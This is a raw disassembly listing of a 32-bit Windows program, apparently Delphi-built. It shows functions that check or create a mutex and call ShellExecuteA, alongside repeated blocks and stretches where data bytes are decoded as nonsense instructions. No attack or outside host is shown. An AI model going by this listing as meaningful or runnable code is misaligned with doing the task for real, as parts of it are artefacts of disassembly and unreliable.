jae r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax esi
call sub_401f40
popad
imul ebp [ esi + 0x46 ] 0x9c6d726f
dec ebp
add [ edi + edx * 2 + 0x47 ] dl
add [ eax + eax + 0x9 ] ch
inc ecx
jae r-xdata
imul esp [ edi + 0x6e ] 0x676c44
add [ eax + 0xa8b9090 ] dl
sub ecx 0xb02e
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
xor al 0x5c
add [ eax ] al
imul esp [ edi + 0x6e ] 0x676c44
add [ eax + 0xa8b9090 ] dl
cmp ecx 0x83f2
jg r-xdata
call sub_403604
retn
jmp r-xdata
sub ecx 0x83f3
je r-xdata
je r-xdata
call sub_44846c
retn
call sub_409e38
retn
sub ecx 0x9
je r-xdata
call sub_409e24
retn
cmp ecx 0x8064
jg r-xdata
retn
call sub_409e4c
dec ecx
je r-xdata
sub ecx 0x8065
je r-xdata
je r-xdata
call sub_40a004
retn
dec ecx
je r-xdata
call sub_409b0c
retn
sub ecx 0x383
je r-xdata
call sub_409840
retn
sub ecx 0x11
je r-xdata
call sub_40a014
retn
jmp r-xdata
call sub_409df4
retn
jmp r-xdata
call sub_4097b8
retn
sub ecx 0x39
je r-xdata
call sub_44846c
retn
call sub_409ef4
retn
jmp r-xdata
sub_40413c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax esi
call sub_401f40
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
sub_404184
mov [ ecx + 0x40 ] al
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x46 ] 0x9c6d726f
dec ebp
add [ edi + edx * 2 + 0x47 ] dl
add [ eax + eax + 0x9 ] ch
inc ecx
jae r-xdata
xor al 0x5c
add [ eax ] al
imul esp [ edi + 0x6e ] 0x676c44
add [ eax + 0xa8b9090 ] dl
cmp ecx 0x83f2
jg r-xdata
sub ecx 0x83f3
je r-xdata
je r-xdata
call sub_409e38
retn
sub ecx 0x9
je r-xdata
call sub_409e24
retn
cmp ecx 0x8064
jg r-xdata
retn
call sub_409e4c
dec ecx
je r-xdata
sub ecx 0x8065
je r-xdata
je r-xdata
call sub_40a004
retn
dec ecx
je r-xdata
call sub_409b0c
retn
sub ecx 0x383
je r-xdata
call sub_409840
retn
sub ecx 0x11
je r-xdata
call sub_40a014
retn
jmp r-xdata
call sub_409df4
retn
jmp r-xdata
call sub_4097b8
retn
sub ecx 0x39
je r-xdata
call sub_44846c
retn
call sub_409ef4
retn
jmp r-xdata
sub_404238
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax esi
call sub_401f40
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
sub_404280
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_404364
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4043bc
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
mov [ eax + eax * 2 ] al
push esp
push edi
imul edi [ edx + 0x61 ] 0x69446472
popad
insb
outsd
and [ bp + si ] ch
add [ ebx ] dh
shl [ ebx ] cl
leave
mov [ eax + 0x38c ] edx
mov [ eax + 0x388 ] ecx
mov eax [ eax + 0x384 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
retn
sub_4043f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax 0x9
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx 0xffffffb3
mov eax [ ebx + 0x384 ]
call sub_448410
mov edi eax
mov eax [ ebx + 0x384 ]
call edi
test al al
je r-xdata
mov [ ebx + 0x38c ] 0x9
mov [ ebx + 0x388 ] 0x1
mov eax ebx
call sub_47dde4
mov [ esi + 0xc ] 0x1
sub_404489
add eax [ eax ]
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x40000000 ] dh
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
add [ eax ] al
adc al [ eax ]
add [ eax ] al
and [ ebp + 0x40 ] al
add [ ebx ] al
add [ eax + eax + 0x54 ] dl
push edi
imul edi [ edx + 0x61 ] 0x69446472
popad
insb
outsd
add [ bx + si ] al
add [ ebx + 0x40 ] ch
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x44
inc eax
add [ edi ] al
or eax 0x7a695754
popad
jb r-xdata
adc eax 0x0
test bl bl
jle r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x7420676f
dec ebp
add [ edi + edx * 2 + 0x47 ] dl
add [ eax + eax + 0x7 ] ch
push edi
jpe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
add bl [ ebp - 0x3d ]
pop ebp
retn
inc esp
insb
add [ bx + si ] al
nop
mov ecx [ edx ]
sub ecx 0xb02e
je r-xdata
call sub_4043f8
retn
jmp r-xdata
call sub_44846c
retn
sub_404520
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax esi
call sub_401f40
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
sub_404588
push ebp
mov ebp esp
add esp 0xffffffc0
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x30 ] 0xc
mov eax [ ebp + 0x8 ]
xor edx edx
add eax 0x4
mov [ eax ] edx
xor edx edx
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ eax ] edx
xor edx edx
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
add eax 0x38
mov [ eax ] edx
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
xor ecx ecx
mov [ ebp - 0x30 ] 0x18
mov edx rw-data
call sub_4d25d8
inc [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x24 ]
xor ecx ecx
mov edx rw-data
call sub_4d25d8
inc [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x24 ]
xor edx edx
mov [ ebp - 0xc ] edx
inc [ ebp - 0x24 ]
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x24 ]
pop edx
call sub_402e08
lea eax [ ebp - 0xc ]
mov ecx [ eax ]
push ecx
push rw-data
push 0x18
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x30 ] 0x24
xor ecx ecx
mov eax [ rw-data ]
mov [ ebp - 0x14 ] ecx
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x24 ]
mov eax [ eax ]
call sub_482cb0
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
lea edx [ ebp - 0x18 ]
push edx
mov edx rw-data
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
inc [ ebp - 0x24 ]
xor edx edx
mov [ ebp - 0x1c ] edx
inc [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0x24 ]
pop edx
call sub_402e08
lea eax [ ebp - 0x1c ]
mov ecx [ eax ]
push ecx
push rw-data
push 0x19
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x18 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x40 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_404758
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x6
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0x38
dec [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0x8
dec [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0x4
dec [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
test [ ebp + 0xc ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b0180
pop ecx
sub_4047d4
push ebp
mov ebp esp
push 0x1
push 0x0
push 0x0
mov eax [ ebp + 0xc ]
push eax
push rw-data
call GetDesktopWindow
push eax
call ShellExecuteA
pop ebp
retn
sub_40480c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov eax rw-data
call sub_4c517c
mov ecx [ ebp + 0xc ]
mov dl 0x1
mov eax [ rw-data ]
call sub_41c8a8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x100 ]
mov esi ebx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
mov edx [ rw-data ]
mov eax [ edx ]
call sub_409ba0
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] 0x24
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0xc
sub_4048a8
push ebp
mov ebp esp
add esp 0xffffffcc
mov eax rw-data
push ebx
push esi
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x18 ] 0x2
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d2618
inc [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xc
mov [ ebp - 0x24 ] 0x18
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
lea edx [ ebp - 0x4 ]
lea eax [ ebp + 0xc ]
call sub_4d27b4
test al al
jne r-xdata
mov eax 0x1
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp + 0xc ]
call sub_4d27b4
test al al
setne dl
and edx 0x1
push edx
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
pop ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov edx rw-data
push eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] 0x24
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
lea edx [ ebp - 0xc ]
inc [ ebp - 0x18 ]
mov eax [ edx ]
push eax
call sub_41c700
add esp 0x8
mov ebx eax
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
mov bl 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0xc ] 0x0
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
mov [ esi + 0xc ] 0x1
add esi 0x8
lea edx [ ebp + 0xc ]
mov eax esi
call sub_4d2758
mov [ ebp - 0x24 ] 0x30
xor ecx ecx
mov [ ebp - 0x10 ] ecx
inc [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x18 ]
lea edx [ ebp + 0xc ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x40
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
jmp r-xdata
test bl bl
je r-xdata
push eax
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
pop ecx
test cl cl
je r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov eax rw-data
jmp r-xdata
mov eax ebx
push eax
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp + 0xc ]
xor edx edx
call sub_4d2728
pop eax
mov edx [ ebp - 0x34 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push eax
push rw-data
push rw-data
call sub_41c354
add esp 0xc
lea eax [ ebp + 0xc ]
call j_sub_44a5d8#2
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_41e5d8
sub_404a7c
push ebp
mov ebp esp
add esp 0xfffffecc
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x10c ] 0xc
xor eax eax
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] eax
lea edi [ ebx + 0x4 ]
inc [ ebp - 0x100 ]
mov esi edi
mov eax [ ecx ]
lea edx [ ebp - 0x8 ]
call sub_482cb0
lea eax [ ebp - 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0xc ] edx
lea edx [ ebp - 0xc ]
inc [ ebp - 0x100 ]
call sub_435f48
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x100 ]
inc [ ebp - 0x100 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4d2758
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
call sub_447888
test eax eax
jle r-xdata
mov [ ebp - 0x10c ] 0x3c
mov edx rw-data
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x100 ]
inc [ ebp - 0x100 ]
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax edi
inc [ ebp - 0x100 ]
inc [ ebp - 0x100 ]
lea edx [ ebp - 0x30 ]
lea ecx [ ebp - 0x4 ]
call sub_402e08
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x30 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x10c ] 0x30
mov [ ebp - 0x10c ] 0x48
mov edx rw-data
lea eax [ ebp - 0x34 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x100 ]
lea eax [ ebp - 0x34 ]
inc [ ebp - 0x100 ]
xor edx edx
mov [ ebp - 0x38 ] edx
inc [ ebp - 0x100 ]
lea ecx [ ebp - 0x38 ]
inc [ ebp - 0x100 ]
lea edx [ ebp - 0x4 ]
call sub_402e08
lea eax [ ebp - 0x38 ]
mov ecx [ eax ]
push ecx
push rw-data
push 0x56
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x38 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x34 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x10c ] 0x54
xor ecx ecx
mov [ ebp - 0x3c ] ecx
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x3c ]
call sub_41e604
lea ecx [ ebp - 0x3c ]
mov dl 0x1
inc [ ebp - 0x100 ]
mov eax [ r-xdata ]
mov ecx [ ecx ]
call sub_405948
mov esi eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x10c ] 0x30
push 0x0
mov edx rw-data
lea eax [ ebp - 0x44 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x40 ]
push ecx
mov [ ebp - 0x10c ] 0x60
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x10 ]
mov [ ebx + 0xd ] al
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x44 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4d318c
mov cl [ ebx + 0xd ]
test cl cl
jne r-xdata
mov [ ebp - 0x10c ] 0x18
xor eax eax
lea esi [ ebx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov eax 0x1
inc [ ebp - 0x100 ]
lea edx [ ebp - 0x14 ]
call sub_4478e8
lea eax [ ebp - 0x14 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x18 ] edx
lea edx [ ebp - 0x18 ]
inc [ ebp - 0x100 ]
call sub_435f84
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x100 ]
inc [ ebp - 0x100 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_4d2758
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x10c ] 0x24
lea esi [ ebx + 0x38 ]
mov edx rw-data
lea eax [ ebp - 0x24 ]
call sub_4d3010
inc [ ebp - 0x100 ]
xor edx edx
mov ecx [ eax ]
lea eax [ ebx + 0x38 ]
push ecx
mov [ ebp - 0x120 ] eax
mov [ ebp - 0x20 ] edx
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x120 ]
call sub_41e604
lea ecx [ ebp - 0x20 ]
inc [ ebp - 0x100 ]
mov eax [ ecx ]
xor edx edx
mov [ ebp - 0x28 ] edx
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0x100 ]
pop edx
call sub_435e74
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x100 ]
inc [ ebp - 0x100 ]
lea edx [ ebp - 0x2c ]
mov eax esi
call sub_4d2758
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x2c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebx ] ecx
mov edi rw-data
mov [ ebp - 0x10c ] 0x30
push edi
push 0x0
push 0x1f0001
call OpenMutexA
mov [ ebx ] eax
mov eax [ ebx ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax ]
mov eax [ ecx - 0x4 ]
jmp r-xdata
push edi
push 0x0
push 0x0
call CreateMutexA
mov [ ebx ] eax
jmp r-xdata
mov edx [ ebx ]
push edx
call CloseHandle
mov edi esi
mov [ ebp - 0x4c ] edi
test edi edi
je r-xdata
push 0x0
mov edx rw-data
lea eax [ ebp - 0xdc ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0xd8 ]
push ecx
mov [ ebp - 0x10c ] 0x138
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x10 ]
mov [ ebx + 0x3c ] al
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xdc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xd8 ]
mov edx 0x2
call sub_4d318c
push 0x0
mov edx rw-data
lea eax [ ebp - 0xe4 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0xe0 ]
push ecx
mov [ ebp - 0x10c ] 0x144
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x10 ]
mov [ ebx + 0x3d ] al
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xe4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xe0 ]
mov edx 0x2
call sub_4d318c
mov cl [ ebx + 0x3d ]
mov ebx esi
mov [ ebp - 0xec ] ebx
test ebx ebx
mov [ rw-data ] cl
je r-xdata
lea edx [ ebx + 0x38 ]
lea eax [ ebp - 0xcc ]
mov [ ebp - 0x128 ] edx
mov edx rw-data
mov [ ebp - 0x10c ] 0x12c
call sub_4d3010
inc [ ebp - 0x100 ]
lea edx [ ebp - 0xd0 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xd0 ] eax
push edx
mov edx rw-data
inc [ ebp - 0x100 ]
lea eax [ ebp - 0xc8 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0xc4 ]
push ecx
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0xd0 ]
lea eax [ ebp - 0xd4 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x100 ]
inc [ ebp - 0x100 ]
lea edx [ ebp - 0xd4 ]
mov eax [ ebp - 0x128 ]
call sub_4d2758
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xd4 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xd0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xcc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xc8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0xc4 ]
mov edx 0x2
call sub_4d318c
test eax eax
jne r-xdata
lea eax [ ebx + 0x8 ]
mov edx rw-data
mov [ ebp - 0x124 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10c ] 0x90
call sub_4d3010
inc [ ebp - 0x100 ]
xor ecx ecx
mov edx [ eax ]
lea eax [ ebp - 0x5c ]
push edx
mov [ ebp - 0x5c ] ecx
push eax
lea eax [ ebp - 0x54 ]
inc [ ebp - 0x100 ]
mov edx rw-data
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
push edx
mov edx rw-data
lea eax [ ebp - 0x50 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x5c ]
lea eax [ ebp - 0x60 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x100 ]
inc [ ebp - 0x100 ]
lea edx [ ebp - 0x60 ]
mov eax [ ebp - 0x124 ]
call sub_4d2758
dec [ ebp - 0x100 ]
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x60 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x5c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x58 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x50 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x8 ]
push ecx
push ebx
call sub_4048a8
add esp 0x8
push 0x0
mov edx rw-data
lea eax [ ebp - 0x68 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x64 ]
push ecx
mov [ ebp - 0x10c ] 0x9c
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x10 ]
mov [ ebx + 0xe ] al
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x64 ]
mov edx 0x2
call sub_4d318c
push 0x1
mov edx rw-data
lea eax [ ebp - 0x70 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x6c ]
push ecx
mov [ ebp - 0x10c ] 0xa8
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x10 ]
mov [ ebx + 0xf ] al
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x6c ]
mov edx 0x2
call sub_4d318c
push 0x3e8
mov edx rw-data
lea eax [ ebp - 0x78 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x10c ] 0xb4
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x10 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x78 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4d318c
push 0x2710
mov edx rw-data
lea eax [ ebp - 0x80 ]
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x7c ]
push ecx
mov [ ebp - 0x10c ] 0xc0
call sub_4d3010
inc [ ebp - 0x100 ]
mov edx [ eax ]
mov eax esi
pop ecx
mov edi [ eax ]
call [ edi + 0x8 ]
mov [ ebx + 0x14 ] eax
dec [ ebp - 0x100 ]
lea eax [ ebp - 0x80 ]
mov edx 0x2
call sub_4d318c
